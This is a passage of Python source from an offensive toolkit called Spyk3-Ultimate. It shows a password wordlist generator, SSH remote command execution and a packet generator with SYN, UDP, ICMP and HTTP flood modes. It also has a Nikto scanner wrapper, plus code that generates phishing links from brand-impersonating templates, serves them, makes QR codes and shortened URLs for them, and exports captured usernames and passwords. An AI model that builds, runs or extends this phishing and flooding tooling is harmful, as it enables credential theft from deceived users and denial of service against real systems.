                    charset=charset[:100], pattern=pattern or 'custom',
                    file_size=file_size, line_count=line_count,
                    created_at=datetime.datetime.now().isoformat(), status='completed'
                )
                
                self.db.save_crunch_wordlist(wordlist)
                
                return {
                    'success': True, 'wordlist_id': wordlist_id, 'name': name,
                    'filename': filename, 'path': output_path, 'file_size': file_size,
                    'line_count': line_count, 'execution_time': execution_time
                }
            else:
                return {'success': False, 'error': result.stderr, 'execution_time': execution_time}
                
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Wordlist generation timed out', 'execution_time': time.time() - start_time}
    
    def _generate_fallback(self, name: str, min_length: int, max_length: int,
                          charset: str, pattern: str, start_time: float) -> Dict[str, Any]:
        """Fallback wordlist generation when crunch not available"""
        timestamp = int(time.time())
        filename = f"crunch_{name.replace(' ', '_')}_{min_length}-{max_length}_{timestamp}.txt"
        output_path = os.path.join(CRUNCH_OUTPUT_DIR, filename)
        
        try:
            sample_size = min(1000, self.max_line_count)
            line_count = 0
            
            with open(output_path, 'w') as f:
                for i in range(min(sample_size, 100)):
                    if pattern and '@' in pattern:
                        word = pattern.replace('@', random.choice('abcdefghijklmnopqrstuvwxyz'))
                        word = word.replace('%', random.choice('0123456789'))
                    else:
                        length = random.randint(min_length, max_length)
                        word = ''.join(random.choice(charset) for _ in range(length))
                    f.write(word + '\n')
                    line_count += 1
            
            file_size = os.path.getsize(output_path)
            execution_time = time.time() - start_time
            
            wordlist_id = str(uuid.uuid4())[:8]
            wordlist = CrunchWordlist(
                id=wordlist_id, name=name, filename=filename,
                min_length=min_length, max_length=max_length,
                charset=charset[:100], pattern=pattern or 'fallback',
                file_size=file_size, line_count=line_count,
                created_at=datetime.datetime.now().isoformat(), status='completed'
            )
            
            self.db.save_crunch_wordlist(wordlist)
            
            return {
                'success': True, 'wordlist_id': wordlist_id, 'name': name,
                'filename': filename, 'path': output_path, 'file_size': file_size,
                'line_count': line_count, 'note': 'Generated with fallback method (crunch not installed)',
                'execution_time': execution_time
            }
        except Exception as e:
            return {'success': False, 'error': str(e), 'execution_time': time.time() - start_time}
    
    def _estimate_line_count(self, charset: str, min_len: int, max_len: int) -> int:
        try:
            charset_size = len(charset)
            total = 0
            for length in range(min_len, max_len + 1):
                total += charset_size ** length
                if total > self.max_line_count:
                    return self.max_line_count
            return min(total, self.max_line_count)
        except:
            return 0
    
    def get_wordlists(self) -> List[Dict]:
        return self.db.get_crunch_wordlists()
    
    def get_wordlist(self, wordlist_id: str) -> Optional[Dict]:
        return self.db.get_crunch_wordlist(wordlist_id)
    
    def delete_wordlist(self, wordlist_id: str) -> bool:
        wordlist = self.db.get_crunch_wordlist(wordlist_id)
        if wordlist:
            filepath = os.path.join(CRUNCH_OUTPUT_DIR, wordlist['filename'])
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
            except:
                pass
        return self.db.delete_crunch_wordlist(wordlist_id)
    
    def get_charsets(self) -> Dict[str, str]:
        return self.charsets


# =====================
# SSH MANAGER
# =====================
class SSHManager:
    """SSH connection manager for remote command execution"""
    
    def __init__(self, db: DatabaseManager, config: Dict = None):
        self.db = db
        self.config = config or {}
        self.connections = {}
        self.shells = {}
        self.lock = threading.Lock()
        self.max_connections = self.config.get('ssh', {}).get('max_connections', 5)
        self.default_timeout = self.config.get('ssh', {}).get('default_timeout', 30)
    
    def add_server(self, name: str, host: str, username: str, password: str = None,
                  key_file: str = None, port: int = 22, notes: str = "") -> Dict[str, Any]:
        try:
            server_id = str(uuid.uuid4())[:8]
            
            if key_file and not os.path.exists(key_file):
                return {'success': False, 'error': f'Key file not found: {key_file}'}
            
            server = SSHServer(
                id=server_id, name=name, host=host, port=port, username=username,
                password=password, key_file=key_file, use_key=key_file is not None,
                timeout=self.default_timeout, notes=notes,
                created_at=datetime.datetime.now().isoformat()
            )
            
            if self.db.add_ssh_server(server):
                return {'success': True, 'server_id': server_id, 'message': f'Server {name} added successfully'}
            else:
                return {'success': False, 'error': 'Failed to add server to database'}
                
        except Exception as e:
            logger.error(f"Failed to add SSH server: {e}")
            return {'success': False, 'error': str(e)}
    
    def remove_server(self, server_id: str) -> bool:
        self.disconnect(server_id)
        return self.db.delete_ssh_server(server_id)
    
    def connect(self, server_id: str) -> Dict[str, Any]:
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'error': 'Paramiko not installed. Install with: pip install paramiko'}
        
        with self.lock:
            if server_id in self.connections:
                return {'success': True, 'message': 'Already connected'}
            
            if len(self.connections) >= self.max_connections:
                return {'success': False, 'error': f'Max connections ({self.max_connections}) reached'}
            
            server = self.db.get_ssh_server(server_id)
            if not server:
                return {'success': False, 'error': f'Server {server_id} not found'}
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                connect_kwargs = {
                    'hostname': server['host'], 'port': server['port'],
                    'username': server['username'], 'timeout': server.get('timeout', self.default_timeout)
                }
                
                if server.get('use_key') and server.get('key_file'):
                    key = paramiko.RSAKey.from_private_key_file(server['key_file'])
                    connect_kwargs['pkey'] = key
                elif server.get('password'):
                    connect_kwargs['password'] = server['password']
                else:
                    return {'success': False, 'error': 'No authentication method available'}
                
                client.connect(**connect_kwargs)
                
                self.connections[server_id] = client
                self.db.update_platform_status('SSH', True, 'connected')
                
                return {'success': True, 'message': f'Connected to {server["name"]} ({server["host"]})'}
                
            except Exception as e:
                return {'success': False, 'error': str(e)}
    
    def disconnect(self, server_id: str = None):
        with self.lock:
            if server_id:
                if server_id in self.connections:
                    try:
                        self.connections[server_id].close()
                    except:
                        pass
                    del self.connections[server_id]
                if server_id in self.shells:
                    try:
                        self.shells[server_id].close()
                    except:
                        pass
                    del self.shells[server_id]
            else:
                for sid in list(self.connections.keys()):
                    self.disconnect(sid)
    
    def execute_command(self, server_id: str, command: str, timeout: int = None,
                       executed_by: str = "system") -> SSHCommandResult:
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return SSHCommandResult(
                    success=False, output='', error=connect_result.get('error', 'Connection failed'),
                    execution_time=time.time() - start_time, server=server_id, command=command
                )
        
        client = self.connections[server_id]
        server = self.db.get_ssh_server(server_id)
        server_name = server['name'] if server else server_id
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout or self.default_timeout)
            
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            
            execution_time = time.time() - start_time
            
            result = SSHCommandResult(
                success=len(error) == 0, output=output, error=error if error else None,
                execution_time=execution_time, server=server_name, command=command
            )
            
            self.db.log_ssh_command(
                server_id=server_id, server_name=server_name, command=command,
                success=result.success, output=output, error=error if error else None,
                execution_time=execution_time, executed_by=executed_by
            )
            
            return result
            
        except Exception as e:
            logger.error(f"Command execution error: {e}")
            return SSHCommandResult(
                success=False, output='', error=str(e),
                execution_time=time.time() - start_time, server=server_name, command=command
            )
    
    def get_status(self) -> Dict[str, Any]:
        with self.lock:
            status = {'total_connections': len(self.connections), 'max_connections': self.max_connections, 'connections': []}
            for sid in self.connections:
                try:
                    transport = self.connections[sid].get_transport()
                    status['connections'].append({'server_id': sid, 'active': transport and transport.is_active()})
                except:
                    status['connections'].append({'server_id': sid, 'active': False})
            return status
    
    def get_servers(self) -> List[Dict]:
        servers = self.db.get_ssh_servers()
        for server in servers:
            server['connected'] = server['id'] in self.connections
        return servers


# =====================
# TRAFFIC GENERATOR ENGINE
# =====================
class TrafficGeneratorEngine:
    """Real network traffic generator using Scapy and sockets"""
    
    def __init__(self, db: DatabaseManager, config: Dict = None):
        self.db = db
        self.config = config or {}
        self.active_generators = {}
        self.stop_events = {}
        
        self.traffic_types = {
            TrafficType.ICMP: "ICMP echo requests (ping)",
            TrafficType.TCP_SYN: "TCP SYN packets (half-open)",
            TrafficType.TCP_ACK: "TCP ACK packets",
            TrafficType.TCP_CONNECT: "Full TCP connections",
            TrafficType.UDP: "UDP packets",
            TrafficType.HTTP_GET: "HTTP GET requests",
            TrafficType.HTTP_POST: "HTTP POST requests",
            TrafficType.HTTPS: "HTTPS requests",
            TrafficType.DNS: "DNS queries",
            TrafficType.ARP: "ARP requests",
            TrafficType.PING_FLOOD: "ICMP flood",
            TrafficType.SYN_FLOOD: "SYN flood",
            TrafficType.UDP_FLOOD: "UDP flood",
            TrafficType.HTTP_FLOOD: "HTTP flood",
            TrafficType.MIXED: "Mixed traffic types",
            TrafficType.RANDOM: "Random traffic patterns"
        }
        
        self.has_raw_socket = self._check_raw_socket()
    
    def _check_raw_socket(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.close()
            return True
        except:
            return False
    
    def get_available_traffic_types(self) -> List[str]:
        available = [TrafficType.TCP_CONNECT, TrafficType.HTTP_GET, TrafficType.HTTP_POST, TrafficType.HTTPS, TrafficType.DNS]
        if SCAPY_AVAILABLE and self.has_raw_socket:
            available.extend([TrafficType.ICMP, TrafficType.TCP_SYN, TrafficType.TCP_ACK, TrafficType.UDP,
                              TrafficType.ARP, TrafficType.PING_FLOOD, TrafficType.SYN_FLOOD, TrafficType.UDP_FLOOD,
                              TrafficType.HTTP_FLOOD, TrafficType.MIXED, TrafficType.RANDOM])
        return available
    
    def generate_traffic(self, traffic_type: str, target_ip: str, duration: int,
                        port: int = None, packet_rate: int = 100, executed_by: str = "system") -> TrafficGenerator:
        if traffic_type not in self.traffic_types:
            raise ValueError(f"Invalid traffic type. Available: {list(self.traffic_types.keys())}")
        
        max_duration = self.config.get('traffic_generation', {}).get('max_duration', 300)
        if duration > max_duration:
            raise ValueError(f"Duration exceeds maximum allowed ({max_duration} seconds)")
        
        allow_floods = self.config.get('traffic_generation', {}).get('allow_floods', False)
        flood_types = [TrafficType.PING_FLOOD, TrafficType.SYN_FLOOD, TrafficType.UDP_FLOOD, TrafficType.HTTP_FLOOD]
        if traffic_type in flood_types and not allow_floods:
            raise ValueError(f"Flood traffic types are disabled in configuration")
        
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            raise ValueError(f"Invalid IP address: {target_ip}")
        
        if port is None:
            if traffic_type in [TrafficType.HTTP_GET, TrafficType.HTTP_POST, TrafficType.HTTP_FLOOD]:
                port = 80
            elif traffic_type == TrafficType.HTTPS:
                port = 443
            elif traffic_type == TrafficType.DNS:
                port = 53
            elif traffic_type in [TrafficType.TCP_SYN, TrafficType.TCP_ACK, TrafficType.TCP_CONNECT, TrafficType.SYN_FLOOD]:
                port = 80
            elif traffic_type == TrafficType.UDP:
                port = 53
            else:
                port = 0
        
        generator_id = str(uuid.uuid4())[:8]
        generator = TrafficGenerator(
            id=generator_id, traffic_type=traffic_type, target_ip=target_ip, target_port=port,
            duration=duration, packet_rate=packet_rate, start_time=datetime.datetime.now().isoformat(), status="running"
        )
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(target=self._run_traffic_generator, args=(generator, stop_event, executed_by))
        thread.daemon = True
        thread.start()
        
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_traffic_generator(self, generator: TrafficGenerator, stop_event: threading.Event, executed_by: str):
        try:
            start_time = time.time()
            end_time = start_time + generator.duration
            packet_interval = 1.0 / max(1, generator.packet_rate)
            
            generator_func = self._get_generator_function(generator.traffic_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    packet_size = generator_func(generator.target_ip, generator.target_port)
                    if packet_size > 0:
                        generator.packets_sent += 1
                        generator.bytes_sent += packet_size
                    time.sleep(packet_interval)
                except Exception as e:
                    time.sleep(0.1)
            
            generator.end_time = datetime.datetime.now().isoformat()
            generator.status = "completed" if not stop_event.is_set() else "stopped"
            self.db.log_traffic(generator, executed_by)
            
        except Exception as e:
            generator.status = "failed"
            generator.error = str(e)
            self.db.log_traffic(generator, executed_by)
        
        finally:
            if generator.id in self.active_generators:
                del self.active_generators[generator.id]
    
    def _get_generator_function(self, traffic_type: str):
        generators = {
            TrafficType.ICMP: self._generate_icmp, TrafficType.TCP_SYN: self._generate_tcp_syn,
            TrafficType.TCP_ACK: self._generate_tcp_ack, TrafficType.TCP_CONNECT: self._generate_tcp_connect,
            TrafficType.UDP: self._generate_udp, TrafficType.HTTP_GET: self._generate_http_get,
            TrafficType.HTTP_POST: self._generate_http_post, TrafficType.HTTPS: self._generate_https,
            TrafficType.DNS: self._generate_dns, TrafficType.ARP: self._generate_arp,
            TrafficType.PING_FLOOD: self._generate_icmp, TrafficType.SYN_FLOOD: self._generate_tcp_syn,
            TrafficType.UDP_FLOOD: self._generate_udp, TrafficType.HTTP_FLOOD: self._generate_http_get,
            TrafficType.MIXED: self._generate_mixed, TrafficType.RANDOM: self._generate_random
        }
        return generators.get(traffic_type, self._generate_icmp)
    
    def _generate_icmp(self, target_ip: str, port: int) -> int:
        if SCAPY_AVAILABLE and self.has_raw_socket:
            try:
                from scapy.all import IP, ICMP, send
                packet = IP(dst=target_ip)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            except:
                pass
        return 0
    
    def _generate_tcp_syn(self, target_ip: str, port: int) -> int:
        if SCAPY_AVAILABLE and self.has_raw_socket:
            try:
                from scapy.all import IP, TCP, send
                packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            except:
                pass
        return 0
    
    def _generate_tcp_ack(self, target_ip: str, port: int) -> int:
        if SCAPY_AVAILABLE and self.has_raw_socket:
            try:
                from scapy.all import IP, TCP, send
                packet = IP(dst=target_ip)/TCP(dport=port, flags="A", seq=random.randint(0, 1000000))
                send(packet, verbose=False)
                return len(packet)
            except:
                pass
        return 0
    
    def _generate_tcp_connect(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Spyk3Ultimate\r\n\r\n"
            sock.send(data.encode())
            sock.close()
            return len(data) + 40
        except:
            return 0
    
    def _generate_udp(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"Spyk3Ultimate UDP Test" + os.urandom(32)
            sock.sendto(data, (target_ip, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _generate_http_get(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "Spyk3Ultimate"})
            conn.getresponse()
            conn.close()
            return 100
        except:
            return 0
    
    def _generate_http_post(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            data = "test=data&from=spyk3"
            conn.request("POST", "/", body=data, headers={"User-Agent": "Spyk3Ultimate", "Content-Type": "application/x-www-form-urlencoded"})
            conn.getresponse()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _generate_https(self, target_ip: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target_ip, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "Spyk3Ultimate"})
            conn.getresponse()
            conn.close()
            return 200
        except:
            return 0
    
    def _generate_dns(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            answer_rrs = b'\x00\x00'
            authority_rrs = b'\x00\x00'
            additional_rrs = b'\x00\x00'
            query = b'\x06google\x03com\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            dns_query = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + query + qtype + qclass
            sock.sendto(dns_query, (target_ip, port))
            sock.close()
            return len(dns_query) + 8
        except:
            return 0
    
    def _generate_arp(self, target_ip: str, port: int) -> int:
        if SCAPY_AVAILABLE and self.has_raw_socket:
            try:
                from scapy.all import Ether, ARP, sendp
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
                sendp(packet, verbose=False)
                return len(packet)
            except:
                pass
        return 0
    
    def _generate_mixed(self, target_ip: str, port: int) -> int:
        generators = [self._generate_icmp, self._generate_tcp_syn, self._generate_udp, self._generate_http_get]
        return random.choice(generators)(target_ip, port)
    
    def _generate_random(self, target_ip: str, port: int) -> int:
        traffic_types = [TrafficType.ICMP, TrafficType.TCP_SYN, TrafficType.TCP_ACK, TrafficType.UDP, TrafficType.HTTP_GET]
        return self._get_generator_function(random.choice(traffic_types))(target_ip, port)
    
    def _get_local_mac(self) -> str:
        try:
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop_generation(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active_generators(self) -> List[Dict]:
        return [{'id': gen.id, 'target_ip': gen.target_ip, 'traffic_type': gen.traffic_type,
                 'packets_sent': gen.packets_sent, 'status': gen.status} 
                for gen in self.active_generators.values()]
    
    def get_traffic_types_help(self) -> str:
        help_text = "📡 Available Traffic Types:\n\n"
        help_text += "  icmp, tcp_syn, tcp_ack, tcp_connect, udp, http_get, http_post, https, dns\n"
        if self.has_raw_socket and SCAPY_AVAILABLE:
            help_text += "\n⚠️  Advanced Traffic:\n  arp, ping_flood, syn_flood, udp_flood, http_flood, mixed, random\n"
        return help_text


# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    """Nikto web vulnerability scanner integration"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.nikto_available = shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict[str, Any]:
        start_time = time.time()
        options = options or {}
        
        if not self.nikto_available:
            return {'success': False, 'error': 'Nikto is not installed'}
        
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            
            cmd = ['nikto', '-host', target]
            if options.get('ssl') or target.startswith('https://'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
            cmd.extend(['-Format', 'json', '-o', output_file])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=options.get('timeout', 600))
            scan_time = time.time() - start_time
            
            vulnerabilities = self._parse_vulnerabilities(result.stdout, output_file)
            
            self.db.log_nikto_scan(target, vulnerabilities, output_file, scan_time, result.returncode == 0)
            
            return {'success': result.returncode == 0, 'vulnerabilities': vulnerabilities, 'scan_time': scan_time, 'output_file': output_file}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _parse_vulnerabilities(self, output: str, json_file: str) -> List[Dict]:
        vulnerabilities = []
        
        if os.path.exists(json_file):
            try:
                with open(json_file, 'r') as f:
                    data = json.load(f)
                    if isinstance(data, list):
                        vulnerabilities = data
                    elif isinstance(data, dict) and 'vulnerabilities' in data:
                        vulnerabilities = data['vulnerabilities']
            except:
                pass
        
        if not vulnerabilities:
            lines = output.split('\n')
            for line in lines:
                if '+ ' in line or '- ' in line:
                    severity = Severity.MEDIUM
                    if 'critical' in line.lower() or 'remote root' in line.lower():
                        severity = Severity.CRITICAL
                    elif 'high' in line.lower():
                        severity = Severity.HIGH
                    elif 'low' in line.lower():
                        severity = Severity.LOW
                    
                    vulnerabilities.append({'description': line.strip(), 'severity': severity})
        
        return vulnerabilities
    
    def check_availability(self) -> bool:
        return self.nikto_available


# =====================
# MAIN APPLICATION
# =====================
class Spyk3Ultimate:
    """Main application class"""
    
    def __init__(self):
        self.db = DatabaseManager()
        self.crunch_gen = CrunchGenerator(self.db)
        self.ssh_manager = SSHManager(self.db)
        self.traffic_gen = TrafficGeneratorEngine(self.db)
        self.nikto_scanner = NiktoScanner(self.db)
        self.phishing_server = PhishingServer(self.db)
        self.active_links = {}
        self.session_id = self.db.create_session("local_user")
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.BLUE1}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.BLUE2}        🔱 SPYK3-ULTIMATE BOT v1.0.0  Advanced Cybersecurity Framework BY ACD        {Colors.BLUE1}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.CYAN}  🎣 50+ Phishing Templates         🔐 Crunch Wordlist Generator              {Colors.BLUE1}║
║{Colors.CYAN}  🔌 SSH Remote Command Execution   🚀 REAL Traffic Generation               {Colors.BLUE1}║
║{Colors.CYAN}  📱 Multi-Platform Bots            🕷️ Nikto Web Vulnerability Scanner       {Colors.BLUE1}║
║{Colors.CYAN}  🔒 IP Management & Blocking       📊 Real-time Credential Capture          {Colors.BLUE1}║
║{Colors.CYAN}  📱 QR Code Generation             🔗 URL Shortening                        {Colors.BLUE1}║
║{Colors.CYAN}  📈 Statistics & Reporting         📤 Export Capabilities                   {Colors.BLUE1}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.GREEN1}  Categories:                                                              {Colors.BLUE1}║
║{Colors.GREEN1}  • Social Media (11)  • E-commerce (8)   • Cloud & Productivity (12)      {Colors.BLUE1}║
║{Colors.GREEN1}  • Gaming (8)         • Streaming (7)    • Finance (6)                    {Colors.BLUE1}║
║{Colors.GREEN1}  • Creative (3)                                                           {Colors.BLUE1}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ORANGE1}            Type 'help' for commands | 'exit' to quit                     {Colors.BLUE1}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
    
    def print_help(self):
        help_text = f"""
{Colors.BLUE2}┌───────────────── SPYK3-ULTIMATE COMMANDS ─────────────────┐{Colors.RESET}

{Colors.GREEN1}🎣 PHISHING COMMANDS:{Colors.RESET}
  phish_list [category]               - List templates (social_media, ecommerce, cloud, gaming, streaming, finance, creative)
  phish_categories                    - List all categories
  phish_platforms <category>          - List platforms in category
  phish_generate <template>           - Generate phishing link
  phish_start <link_id> [port]        - Start phishing server
  phish_stop                           - Stop phishing server
  phish_status                         - Check server status
  phish_links [all]                   - List all links
  phish_creds [link_id]               - View captured credentials
  phish_qr <link_id>                  - Generate QR code
  phish_shorten <link_id>             - Shorten URL
  phish_stats                          - View statistics
  phish_export [format] [link_id]     - Export credentials (json/csv/txt)

{Colors.GREEN1}🔐 CRUNCH COMMANDS:{Colors.RESET}
  crunch_generate <name> <min> <max> [pattern] [charset] - Generate wordlist
  crunch_list                          - List generated wordlists
  crunch_info <id>                     - Show wordlist details
  crunch_delete <id>                   - Delete wordlist
  crunch_charsets                      - Show available charsets

{Colors.GREEN1}🔌 SSH COMMANDS:{Colors.RESET}
  ssh_add <name> <host> <user> [password] [port] - Add SSH server
  ssh_list                             - List SSH servers
  ssh_connect <id>                     - Connect to server
  ssh_exec <id> <command>              - Execute command
  ssh_disconnect [id]                  - Disconnect from server

{Colors.GREEN1}🚀 TRAFFIC GENERATION:{Colors.RESET}
  generate_traffic <type> <ip> <duration> [port] [rate] - Generate real traffic
  traffic_types                        - List available traffic types
  traffic_status                       - Check active generators
  traffic_stop [id]                    - Stop traffic generation
  traffic_logs [limit]                 - View traffic logs
  traffic_help                         - Detailed help

{Colors.GREEN1}🕷️ NIKTO WEB SCANNER:{Colors.RESET}
  nikto <target>                       - Basic web vulnerability scan
  nikto_ssl <target>                   - SSL/TLS specific scan
  nikto_full <target>                  - Full scan with all tests
  nikto_status                         - Check scanner status

{Colors.GREEN1}🔒 IP MANAGEMENT:{Colors.RESET}
  add_ip <ip> [notes]                  - Add IP to monitoring
  remove_ip <ip>                       - Remove IP from monitoring
  block_ip <ip> [reason]               - Block IP address
  unblock_ip <ip>                      - Unblock IP address
  list_ips [active/blocked]            - List managed IPs
  ip_info <ip>                         - Detailed IP information

{Colors.GREEN1}📊 SYSTEM COMMANDS:{Colors.RESET}
  status                               - System status
  threats [limit]                      - View recent threats
  report                               - Generate security report
  history [limit]                      - View command history
  clear                                - Clear screen
  exit                                 - Exit program

{Colors.GREEN1}💡 EXAMPLES:{Colors.RESET}
  phish_list social_media
  phish_generate facebook_classic
  phish_start abc12345 8080
  phish_creds
  phish_qr abc12345
  crunch_generate passwords 8 12 alphanum
  ssh_add myserver 192.168.1.100 root
  generate_traffic icmp 192.168.1.1 10
  nikto example.com
  add_ip 192.168.1.100 Suspicious
  block_ip 10.0.0.5 Port scanning

{Colors.BLUE2}└──────────────────────────────────────────────────────────┘{Colors.RESET}
        """
        print(help_text)
    
    def check_dependencies(self):
        print(f"\n{Colors.BLUE1}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = {'ping': False, 'nmap': False, 'curl': False, 'dig': False, 'ssh': False, 'crunch': False, 'nikto': False}
        for tool in tools:
            if shutil.which(tool):
                tools[tool] = True
                print(f"{Colors.GREEN1}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.ORANGE1}⚠️ {tool} not found{Colors.RESET}")
        
        if QRCODE_AVAILABLE:
            print(f"{Colors.GREEN1}✅ qrcode{Colors.RESET}")
        else:
            print(f"{Colors.ORANGE1}⚠️ qrcode not found - QR generation disabled{Colors.RESET}")
        
        if SHORTENER_AVAILABLE:
            print(f"{Colors.GREEN1}✅ pyshorteners{Colors.RESET}")
        else:
            print(f"{Colors.ORANGE1}⚠️ pyshorteners not found - URL shortening disabled{Colors.RESET}")
        
        if PARAMIKO_AVAILABLE:
            print(f"{Colors.GREEN1}✅ paramiko{Colors.RESET}")
        else:
            print(f"{Colors.ORANGE1}⚠️ paramiko not found - SSH features disabled{Colors.RESET}")
        
        if SCAPY_AVAILABLE:
            print(f"{Colors.GREEN1}✅ scapy{Colors.RESET}")
        else:
            print(f"{Colors.ORANGE1}⚠️ scapy not found - advanced traffic disabled{Colors.RESET}")
        
        if self.traffic_gen.has_raw_socket:
            print(f"{Colors.GREEN1}✅ raw socket permission{Colors.RESET}")
        else:
            print(f"{Colors.ORANGE1}⚠️ raw socket permission denied - run with sudo/admin{Colors.RESET}")
        
        print(f"{Colors.GREEN1}✅ Database: {DATABASE_FILE}{Colors.RESET}")
        print(f"{Colors.GREEN1}✅ Templates: {len(self.db.get_templates())} available{Colors.RESET}")
        print()
    
    def generate_phishing_link(self, template_name: str, notes: str = "") -> Dict[str, Any]:
        """Generate phishing link using specified template"""
        template = self.db.get_template(template_name)
        if not template:
            return {'success': False, 'error': f"Template '{template_name}' not found"}
        
        link_id = str(uuid.uuid4())[:8]
        
        link = PhishingLink(
            id=link_id, platform=template['platform'], platform_category=template['category'],
            phishing_url=f"http://localhost:8080/{link_id}", original_url=None,
            template_name=template_name, created_at=datetime.datetime.now().isoformat(),
            notes=notes
        )
        
        qr_path = self._generate_qr_code(link_id, link.phishing_url)
        if qr_path:
            link.qr_code_path = qr_path
        
        if SHORTENER_AVAILABLE:
            short_url = self._shorten_url(link.phishing_url)
            if short_url:
                link.short_url = short_url
        
        if self.db.save_phishing_link(link):
            self.active_links[link_id] = {
                'platform': template['platform'], 'category': template['category'],
                'html': template['html_content'], 'created': datetime.datetime.now(),
                'qr_path': qr_path, 'short_url': link.short_url
            }
            
            return {
                'success': True, 'link_id': link_id, 'platform': template['platform'],
                'category': template['category'], 'phishing_url': link.phishing_url,
                'short_url': link.short_url, 'qr_code': qr_path,
                'created_at': link.created_at
            }
        else:
            return {'success': False, 'error': 'Failed to save link to database'}
    
    def start_phishing_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            link = self.db.get_phishing_link(link_id)
            if not link:
                return False
            template = self.db.get_template(link['template_name'])
            if not template:
                return False
            self.active_links[link_id] = {
                'platform': link['platform'], 'category': link['platform_category'],
                'html': template['html_content'], 'created': datetime.datetime.fromisoformat(link['created_at'])
            }
        
        link_data = self.active_links[link_id]
        return self.phishing_server.start(link_id, link_data['platform'], link_data['html'], port)
    
    def _generate_qr_code(self, link_id: str, url: str) -> Optional[str]:
        if not QRCODE_AVAILABLE:
            return None
        try:
            filename = os.path.join(QR_CODES_DIR, f"qr_{link_id}.png")
            qr = qrcode.QRCode(version=1, box_size=10, border=5, error_correction=qrcode.constants.ERROR_CORRECT_H)
            qr.add_data(url)
            qr.make(fit=True)
            qr.make_image(fill_color="black", back_color="white").save(filename)
            return filename
        except:
            return None
    
    def _shorten_url(self, url: str) -> Optional[str]:
        if not SHORTENER_AVAILABLE:
            return None
        try:
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        except:
            return None
    
    def export_credentials(self, format: str = 'json', link_id: Optional[str] = None) -> Optional[str]:
        credentials = self.db.get_captured_credentials(link_id)
        if not credentials:
            return None
        
        timestamp = int(time.time())
        filename = f"credentials_export_{timestamp}.{format}"
        filepath = os.path.join(PHISHING_LOGS_DIR, filename)
        
        try:
            if format == 'json':
                with open(filepath, 'w') as f:
                    json.dump(credentials, f, indent=2, default=str)
            elif format == 'csv':
                import csv
                with open(filepath, 'w', newline='') as f:
                    if credentials:
                        writer = csv.DictWriter(f, fieldnames=credentials[0].keys())
                        writer.writeheader()
                        writer.writerows(credentials)
            elif format == 'txt':
                with open(filepath, 'w') as f:
                    for cred in credentials:
                        f.write(f"Timestamp: {cred.get('timestamp')}\n")
                        f.write(f"Link ID: {cred.get('link_id')}\n")
                        f.write(f"Username: {cred.get('username')}\n")
                        f.write(f"Password: {cred.get('password')}\n")
                        f.write(f"IP: {cred.get('ip_address')}\n")
                        f.write("-" * 50 + "\n")
            return filepath
        except Exception as e:
            logger.error(f"Failed to export credentials: {e}")
            return None
    
